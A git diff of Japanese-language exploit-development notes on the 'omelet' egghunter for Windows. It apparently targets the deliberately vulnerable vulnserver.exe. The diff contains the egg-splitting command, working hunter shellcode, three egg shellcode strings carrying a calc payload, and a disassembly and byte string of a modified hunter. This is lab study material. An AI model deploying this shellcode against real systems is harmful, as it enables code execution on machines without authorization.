@@ -2476,7 +2476,9 @@ egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
 Omuretu-Hunter   
 - `w32_SEH_omelet.py w32_SEH_omelet.bin calc.bin calceggs.txt 127 0xBADA55`   
 `calc.bin`のシェルコードを分割して、calceggs.txtに用意する。127サイズ以下に分割して、マーカーは`0xbada55`に設定。   
-```perl
+omuretu-hunterはタグを頼りに、全ての分割されたeggを見つけて、元のshellcodeをスタックの最後の方に復元して、実行する。   
+
+```C
 // This is the binary code that needs to be executed to find the eggs, 
 // recombine the orignal shellcode and execute it. It is 82 bytes:
 omelet_code = "\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0\x55\xF2\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77\x0C\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xC7\xFF\xFF\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x03\x97\xEB\xDB\x31\xC0\x64\xFF\x50\x08";
@@ -2488,6 +2490,60 @@ omelet_code = "\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0\x55\xF2\xAE\x50\x89\xFE\
 egg0 = "\x55\xFF\x55\xDA\xBA\xB8\x7A\x1D\x40\xC4\xDB\xDF\xD9\x74\x24\xF4\x5B\x31\xC9\xB1\x31\x83\xC3\x04\x31\x43\x0F\x03\x43\x75\xFF\xB5\x38\x61\x7D\x35\xC1\x71\xE2\xBF\x24\x40\x22\xDB\x2D\xF2\x92\xAF\x60\xFE\x59\xFD\x90\x75\x2F\x2A\x96\x3E\x9A\x0C\x99\xBF\xB7\x6D\xB8\x43\xCA\xA1\x1A\x7A\x05\xB4\x5B\xBB\x78\x35\x09\x14\xF6\xE8\xBE\x11\x42\x31\x34\x69\x42\x31\xA9\x39";
 egg1 = "\x55\xFE\x55\xDA\xBA\x65\x10\x7C\x32\x3C\xB2\x7E\x97\x34\xFB\x98\xF4\x71\xB5\x13\xCE\x0E\x44\xF2\x1F\xEE\xEB\x3B\x90\x1D\xF5\x7C\x16\xFE\x80\x74\x65\x83\x92\x42\x14\x5F\x16\x51\xBE\x14\x80\xBD\x3F\xF8\x57\x35\x33\xB5\x1C\x11\x57\x48\xF0\x29\x63\xC1\xF7\xFD\xE2\x91\xD3\xD9\xAF\x42\x7D\x7B\x15\x24\x82\x9B\xF6\x99\x26\xD7\x1A\xCD\x5A\xBA\x70\x10\xE8\xC0\x36\x12";
 egg2 = "\x55\xFD\x55\xDA\xBA\xF2\xCA\x66\x7B\xC3\x41\xE9\xFC\xDC\x83\x4E\xF2\x96\x8E\xE6\x9B\x7E\x5B\xBB\xC1\x80\xB1\xFF\xFF\x02\x30\x7F\x04\x1A\x31\x7A\x40\x9C\xA9\xF6\xD9\x49\xCE\xA5\xDA\x5B\xAD\x28\x49\x07\x1C\xCF\xE9\xA2\x60\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";
+```
+vulnserver.exeで動作したOmuretu-Hunterは以下。   
+```txt
+   0:	83 e9 78             	sub    ecx,0x78
+   3:	83 e9 78             	sub    ecx,0x78
+   6:	83 e9 78             	sub    ecx,0x78
+   9:	83 e9 78             	sub    ecx,0x78
+   c:	83 e9 52             	sub    ecx,0x52
+   f:	89 cf                	mov    edi,ecx
+  11:	bb fd ff ff ff       	mov    ebx,0xfffffffd
+  16:	eb 29                	jmp    0x41
+  18:	51                   	push   ecx
+  19:	64 89 20             	mov    DWORD PTR fs:[eax],esp
+  1c:	fc                   	cld    
+  1d:	b0 55                	mov    al,0x55
+  1f:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
+  21:	50                   	push   eax
+  22:	89 fe                	mov    esi,edi
+  24:	ad                   	lods   eax,DWORD PTR ds:[esi]
+  25:	35 ff 55 da ba       	xor    eax,0xbada55ff
+  2a:	83 f8 03             	cmp    eax,0x3
+  2d:	77 12                	ja     0x41
+  2f:	59                   	pop    ecx
+  30:	f7 e9                	imul   ecx
+  32:	64 03 42 08          	add    eax,DWORD PTR fs:[edx+0x8]
+  36:	97                   	xchg   edi,eax
+  37:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
+  39:	83 fb ff             	cmp    ebx,0xffffffff
+  3c:	74 2e                	je     0x6c
+  3e:	43                   	inc    ebx
+  3f:	89 f7                	mov    edi,esi
+  41:	31 c0                	xor    eax,eax
+  43:	64 8b 08             	mov    ecx,DWORD PTR fs:[eax]
+  46:	89 cc                	mov    esp,ecx
+  48:	59                   	pop    ecx
+  49:	81 f9 ff ff ff ff    	cmp    ecx,0xffffffff
+  4f:	75 f5                	jne    0x46
+  51:	5a                   	pop    edx
+  52:	e8 c1 ff ff ff       	call   0x18
+  57:	61                   	popa   
+  58:	8d 66 18             	lea    esp,[esi+0x18]
+  5b:	58                   	pop    eax
+  5c:	66 0d ff 0f          	or     ax,0xfff
+  60:	40                   	inc    eax
+  61:	78 03                	js     0x66
+  63:	97                   	xchg   edi,eax
+  64:	eb db                	jmp    0x41
+  66:	31 c0                	xor    eax,eax
+  68:	64 ff 50 08          	call   DWORD PTR fs:[eax+0x8]
+  6c:	c1 ef 08             	shr    edi,0x8
+  6f:	c1 e7 08             	shl    edi,0x8
+  72:	ff e7                	jmp    edi
+
+\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft.C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xffa\x8df\x18Xf\r\xff\x0f@x\x03\x97\xeb\xdb1\xc0d\xffP\x08\xc1\xef\x08\xc1\xe7\x08\xff\xe7
 ```
 #### Windows周り
 - `arwin`   
